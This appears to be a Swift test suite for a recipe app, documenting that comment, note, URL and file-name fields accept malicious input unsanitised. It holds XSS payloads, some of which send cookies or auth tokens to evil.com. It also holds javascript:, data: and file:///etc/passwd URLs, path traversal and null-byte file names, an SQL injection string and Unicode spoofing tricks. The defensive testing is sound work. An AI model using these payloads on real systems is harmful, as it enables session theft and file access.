import Testing
import Foundation
import SwiftData
import SwiftUI

@testable import Heirloom

@Suite("Security Adversarial Tests - XSS, Injection, and Path Traversal")
struct SecurityAdversarialTests {

    // MARK: - Test Setup Helper

    func createTestContext() -> ModelContext {
        let schema = Schema([
            Recipe.self,
            RecipeComment.self,
            RecipeCardBack.self,
            Ingredient.self,
            Tag.self,
            RecipeCollection.self
        ])
        let config = ModelConfiguration(isStoredInMemoryOnly: true)
        let container = try! ModelContainer(for: schema, configurations: config)
        return ModelContext(container)
    }

    // MARK: - XSS Tests - RecipeComment.text

    @Test("Security: RecipeComment blocks script tag XSS attack")
    func testRecipeComment_XSS_ScriptTags() {
        // Arrange
        let context = createTestContext()
        let maliciousText = "<script>alert('XSS');</script>This is a comment"

        // Act
        let comment = RecipeComment(text: maliciousText)
        context.insert(comment)

        // Assert - Currently EXPECTED TO FAIL
        // The text should be sanitized to remove script tags
        // Expected behavior: Text should not contain executable script tags
        let storedText = comment.text

        // This test documents current behavior (likely no sanitization)
        // In production, we expect this to fail, revealing the security gap
        #expect(storedText.contains("<script>")) // Currently TRUE - VULNERABILITY!

        // What we WANT after fixing:
        // #expect(!storedText.contains("<script>"))
        // #expect(!storedText.contains("</script>"))
        // #expect(storedText.contains("This is a comment"))
    }

    @Test("Security: RecipeComment blocks img onerror XSS attack")
    func testRecipeComment_XSS_ImgOnerror() {
        // Arrange
        let context = createTestContext()
        let maliciousText = "<img src=x onerror=alert('XSS')>"

        // Act
        let comment = RecipeComment(text: maliciousText)
        context.insert(comment)

        // Assert - EXPECTED TO FAIL
        let storedText = comment.text

        // Currently no sanitization (VULNERABILITY)
        #expect(storedText.contains("onerror")) // Currently TRUE - VULNERABILITY!

        // What we WANT:
        // #expect(!storedText.contains("onerror"))
        // #expect(!storedText.contains("<img"))
    }

    @Test("Security: RecipeComment blocks iframe injection")
    func testRecipeComment_XSS_IframeInjection() {
        // Arrange
        let context = createTestContext()
        let maliciousText = "<iframe src='javascript:alert(document.cookie)'></iframe>"

        // Act
        let comment = RecipeComment(text: maliciousText)
        context.insert(comment)

        // Assert - EXPECTED TO FAIL
        let storedText = comment.text

        // Currently no sanitization (VULNERABILITY)
        #expect(storedText.contains("<iframe")) // Currently TRUE - VULNERABILITY!

        // What we WANT:
        // #expect(!storedText.contains("<iframe"))
        // #expect(!storedText.contains("javascript:"))
    }

    @Test("Security: RecipeComment blocks SVG onload XSS")
    func testRecipeComment_XSS_SVGOnload() {
        // Arrange
        let context = createTestContext()
        let maliciousText = "<svg onload=alert('XSS')></svg>"

        // Act
        let comment = RecipeComment(text: maliciousText)
        context.insert(comment)

        // Assert - EXPECTED TO FAIL
        let storedText = comment.text

        // Currently no sanitization (VULNERABILITY)
        #expect(storedText.contains("onload")) // Currently TRUE - VULNERABILITY!

        // What we WANT:
        // #expect(!storedText.contains("onload"))
    }

    // MARK: - XSS Tests - RecipeCardBack

    @Test("Security: RecipeCardBack.noteToFriends blocks XSS injection")
    func testRecipeCardBack_XSS_NoteToFriends() {
        // Arrange
        let context = createTestContext()
        let recipe = Recipe(title: "Test Recipe")
        context.insert(recipe)

        let cardBack = RecipeCardBack(recipe: recipe)
        let maliciousNote = "<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>Grandma's secret recipe!"
        cardBack.noteToFriends = maliciousNote
        context.insert(cardBack)

        // Assert - EXPECTED TO FAIL
        #expect(cardBack.noteToFriends?.contains("<script>") == true) // Currently TRUE - VULNERABILITY!

        // What we WANT:
        // #expect(cardBack.noteToFriends?.contains("<script>") == false)
        // #expect(cardBack.noteToFriends?.contains("Grandma's secret recipe!") == true)
    }

    @Test("Security: RecipeCardBack.personalTips blocks XSS in array")
    func testRecipeCardBack_XSS_PersonalTips() {
        // Arrange
        let context = createTestContext()
        let recipe = Recipe(title: "Test Recipe")
        context.insert(recipe)

        let cardBack = RecipeCardBack(recipe: recipe)
        let maliciousTips = [
            "Use fresh garlic",
            "<img src=x onerror='fetch(\"http://evil.com\")'>",
            "Let it rest 5 minutes"
        ]
        cardBack.personalTips = maliciousTips
        context.insert(cardBack)

        // Assert - EXPECTED TO FAIL
        let hasMaliciousCode = cardBack.personalTips.contains { $0.contains("onerror") }
        #expect(hasMaliciousCode == true) // Currently TRUE - VULNERABILITY!

        // What we WANT:
        // #expect(hasMaliciousCode == false)
    }

    // MARK: - XSS Tests - Recipe.notes

    @Test("Security: Recipe.notes blocks XSS injection")
    func testRecipe_XSS_Notes() {
        // Arrange
        let context = createTestContext()
        let recipe = Recipe(title: "Test Recipe")
        let maliciousNotes = """
        Great recipe!
        <script>
        window.location = 'http://evil.com/phishing?data=' + localStorage.getItem('authToken');
        </script>
        """
        recipe.notes = maliciousNotes
        context.insert(recipe)

        // Assert - EXPECTED TO FAIL
        #expect(recipe.notes?.contains("<script>") == true) // Currently TRUE - VULNERABILITY!

        // What we WANT:
        // #expect(recipe.notes?.contains("<script>") == false)
        // #expect(recipe.notes?.contains("Great recipe!") == true)
    }

    // MARK: - URL Injection Tests

    @Test("Security: Recipe.sourceURL rejects javascript: scheme")
    func testRecipe_URLInjection_JavascriptScheme() {
        // Arrange
        let context = createTestContext()
        let recipe = Recipe(title: "Test Recipe")

        // Act - Try to set malicious URL
        let maliciousURL = "javascript:alert(document.cookie)"
        recipe.sourceURL = maliciousURL
        context.insert(recipe)

        // Assert - EXPECTED TO FAIL (currently no validation)
        // The app should reject or sanitize non-http(s) URLs
        #expect(recipe.sourceURL?.starts(with: "javascript:") == true) // Currently TRUE - VULNERABILITY!

        // What we WANT: Validation layer that rejects this
        // Expected behavior:
        // - Validation function returns error for javascript: URLs
        // - Or sourceURL setter sanitizes to nil
        // - Or URL parsing validates scheme is http/https only
    }

    @Test("Security: Recipe.sourceURL rejects data: scheme")
    func testRecipe_URLInjection_DataScheme() {
        // Arrange
        let context = createTestContext()
        let recipe = Recipe(title: "Test Recipe")

        // Act
        let maliciousURL = "data:text/html,<script>alert('XSS')</script>"
        recipe.sourceURL = maliciousURL
        context.insert(recipe)

        // Assert - EXPECTED TO FAIL
        #expect(recipe.sourceURL?.starts(with: "data:") == true) // Currently TRUE - VULNERABILITY!

        // What we WANT:
        // #expect(recipe.sourceURL == nil) // Should be rejected
    }

    @Test("Security: Recipe.sourceURL rejects file: scheme")
    func testRecipe_URLInjection_FileScheme() {
        // Arrange
        let context = createTestContext()
        let recipe = Recipe(title: "Test Recipe")

        // Act
        let maliciousURL = "file:///etc/passwd"
        recipe.sourceURL = maliciousURL
        context.insert(recipe)

        // Assert - EXPECTED TO FAIL
        #expect(recipe.sourceURL?.starts(with: "file:") == true) // Currently TRUE - VULNERABILITY!

        // What we WANT:
        // #expect(recipe.sourceURL == nil)
    }

    @Test("Security: Recipe.sourceURL rejects internal network URLs")
    func testRecipe_URLInjection_InternalNetwork() {
        // Arrange
        let context = createTestContext()
        let recipe = Recipe(title: "Test Recipe")

        // Act - Try to set internal network URL (SSRF risk)
        let maliciousURL = "http://192.168.1.1/admin"
        recipe.sourceURL = maliciousURL
        context.insert(recipe)

        // Assert - EXPECTED TO FAIL
        // The app should block internal IP addresses (SSRF protection)
        #expect(recipe.sourceURL?.contains("192.168.") == true) // Currently TRUE - VULNERABILITY!

        // What we WANT:
        // Validation that rejects:
        // - 192.168.x.x (private network)
        // - 10.x.x.x (private network)
        // - 172.16-31.x.x (private network)
        // - 127.x.x.x (localhost)
        // - 169.254.x.x (link-local)
    }

    // MARK: - Path Traversal Tests

    @Test("Security: Recipe.imageFileName blocks path traversal attack")
    func testRecipe_PathTraversal_ImageFileName() {
        // Arrange
        let context = createTestContext()
        let recipe = Recipe(title: "Test Recipe")

        // Act - Try to set path traversal filename
        let maliciousFilename = "../../../etc/passwd"
        recipe.imageFileName = maliciousFilename
        context.insert(recipe)

        // Assert - EXPECTED TO FAIL
        // The app should reject filenames with path separators
        #expect(recipe.imageFileName?.contains("..") == true) // Currently TRUE - VULNERABILITY!

        // What we WANT:
        // Validation in imageFileName setter or ImageStorageService:
        // - Reject filenames containing ".."
        // - Reject filenames containing "/"
        // - Only allow alphanumeric + safe chars (-, _, .)
        // #expect(recipe.imageFileName == nil) // Should be rejected
    }

    @Test("Security: Recipe.imageFileName blocks absolute path attack")
    func testRecipe_PathTraversal_AbsolutePath() {
        // Arrange
        let context = createTestContext()
        let recipe = Recipe(title: "Test Recipe")

        // Act
        let maliciousFilename = "/var/lib/important-file.txt"
        recipe.imageFileName = maliciousFilename
        context.insert(recipe)

        // Assert - EXPECTED TO FAIL
        #expect(recipe.imageFileName?.starts(with: "/") == true) // Currently TRUE - VULNERABILITY!

        // What we WANT:
        // #expect(recipe.imageFileName == nil) // Should be rejected
    }

    @Test("Security: Recipe.imageFileName blocks null byte injection")
    func testRecipe_PathTraversal_NullByte() {
        // Arrange
        let context = createTestContext()
        let recipe = Recipe(title: "Test Recipe")

        // Act - Null byte can terminate string in some contexts
        let maliciousFilename = "innocent.jpg\0.txt"
        recipe.imageFileName = maliciousFilename
        context.insert(recipe)

        // Assert - EXPECTED TO FAIL
        #expect(recipe.imageFileName?.contains("\0") == true) // Currently TRUE - VULNERABILITY!

        // What we WANT:
        // #expect(recipe.imageFileName == nil) // Should be rejected
    }

    // MARK: - HTML Entity Injection Tests

    @Test("Security: RecipeComment handles malformed HTML entities")
    func testRecipeComment_HTMLEntity_Malformed() {
        // Arrange
        let context = createTestContext()

        // Act - Various malformed HTML entity attacks
        let malformedEntities = """
        Test &#x3C;script&#x3E; encoding
        Test &lt;script&gt; standard
        Test &#60;script&#62; decimal
        Test &LT;SCRIPT&GT; uppercase
        """

        let comment = RecipeComment(text: malformedEntities)
        context.insert(comment)

        // Assert - EXPECTED TO FAIL
        // These should be decoded or blocked
        let hasEncodedScript = comment.text.contains("&#") || comment.text.contains("&lt;")
        #expect(hasEncodedScript == true) // Currently TRUE - Documents current behavior

        // What we WANT:
        // Either: Decode entities then sanitize (remove script tags)
        // Or: Block HTML entities entirely in user content
    }

    // MARK: - Length Limit Tests (Firestore Size)

    @Test("Security: Recipe detects Firestore document size overflow")
    func testRecipe_FirestoreDocumentSize_Overflow() {
        // Arrange
        let context = createTestContext()
        let recipe = Recipe(title: "Test Recipe")

        // Act - Create recipe that would exceed 1MB Firestore limit
        // Firestore limit is 1,048,576 bytes (1MB)
        let hugeString = String(repeating: "A", count: 500_000) // 500KB
        recipe.notes = hugeString
        recipe.sourceStory = hugeString // Another 500KB = 1MB+ total

        // Add many ingredients to push over limit
        var ingredients: [Ingredient] = []
        for i in 0..<1000 {
            let ingredient = Ingredient(originalText: String(repeating: "ingredient ", count: 100))
            ingredient.name = "Ingredient \(i)"
            ingredient.recipe = recipe
            ingredients.append(ingredient)
            context.insert(ingredient)
        }
        recipe.ingredients = ingredients

        context.insert(recipe)

        // Assert - EXPECTED TO FAIL
        // The app should detect oversized documents before upload
        // Currently no size validation (VULNERABILITY)

        // Calculate approximate document size
        let notesSize = recipe.notes?.count ?? 0
        let storySize = recipe.sourceStory?.count ?? 0
        let ingredientsSize = ingredients.reduce(0) { $0 + ($1.name?.count ?? 0) + ($1.originalText?.count ?? 0) }
        let totalSize = notesSize + storySize + ingredientsSize

        #expect(totalSize > 1_000_000) // Over 1MB - would fail Firestore upload

        // What we WANT:
        // - Validation function that calculates document size
        // - Warning to user before attempting upload
        // - Graceful error handling if upload fails
        // - Perhaps compression or chunking strategy
    }

    // MARK: - Edge Cases

    @Test("Security: RecipeComment handles Unicode exploitation attempts")
    func testRecipeComment_Unicode_Exploitation() {
        // Arrange
        let context = createTestContext()

        // Act - Unicode attacks (right-to-left override, zero-width chars, homoglyphs)
        let unicodeAttack = """
        Innocent text\u{202E}tpircs/<tpircs> Hidden reversed script tags
        Zero-width:\u{200B}\u{200C}\u{200D}\u{FEFF}
        Homoglyph: аdmin (Cyrillic 'а' looks like Latin 'a')
        """

        let comment = RecipeComment(text: unicodeAttack)
        context.insert(comment)

        // Assert
        #expect(comment.text.contains("\u{202E}")) // RLO character

        // Documents current behavior - Unicode passes through
        // Potential issues:
        // - RLO can visually hide malicious content
        // - Zero-width chars can bypass filters
        // - Homoglyphs can spoof trusted sources
    }

    @Test("Security: Recipe.sourceURL handles extremely long URLs")
    func testRecipe_URLLength_ExtremelyLong() {
        // Arrange
        let context = createTestContext()
        let recipe = Recipe(title: "Test Recipe")

        // Act - Create 100KB URL (some servers accept, most don't)
        let hugeURL = "https://example.com/recipe?" + String(repeating: "param=value&", count: 10_000)
        recipe.sourceURL = hugeURL
        context.insert(recipe)

        // Assert - EXPECTED TO FAIL
        // URLs should have reasonable length limits (2KB-8KB typical browser limit)
        #expect((recipe.sourceURL?.count ?? 0) > 100_000) // Currently TRUE - VULNERABILITY!

        // What we WANT:
        // #expect(recipe.sourceURL == nil) // Should be rejected
        // Or truncated to reasonable length
    }

    @Test("Security: RecipeComment prevents billion laughs XML attack pattern")
    func testRecipeComment_BillionLaughs_Pattern() {
        // Arrange
        let context = createTestContext()

        // Act - Deeply nested structure (not XML but similar exploitation)
        var nestedString = "lol"
        for _ in 0..<10 {
            nestedString = "[\(nestedString)\(nestedString)\(nestedString)\(nestedString)]"
        }

        let comment = RecipeComment(text: nestedString)
        context.insert(comment)

        // Assert
        // This pattern can cause exponential memory usage
        let length = comment.text.count
        #expect(length > 10_000) // Grows exponentially

        // Documents behavior: SwiftData stores large strings
        // Potential issue: Could cause memory exhaustion
        // What we WANT: Maximum text length validation
    }

    // MARK: - CRDT Security Tests

    @Test("Security: CRDT operation field path validation")
    func testCRDT_MaliciousFieldPath() {
        // This test documents the need for CRDT operation validation
        // Malicious field paths could:
        // - Access unintended fields
        // - Cause crashes with invalid paths
        // - Bypass security checks

        // Documented vulnerabilities:
        // 1. Field path "../../../../private" (path traversal)
        // 2. Field path "ingredients[-1]" (negative array index)
        // 3. Field path "ingredients[999999]" (out of bounds)
        // 4. Field path "__proto__" (prototype pollution in JS, not applicable to Swift but documents pattern)
        // 5. Field path with SQL injection pattern "'; DROP TABLE recipes; --"

        // Currently no test implementation as CRDT operations are in separate file
        // This documents the security concern for future CRDTAdversarialTests.swift

        #expect(true) // Placeholder - see CRDTAdversarialTests for full coverage
    }
}
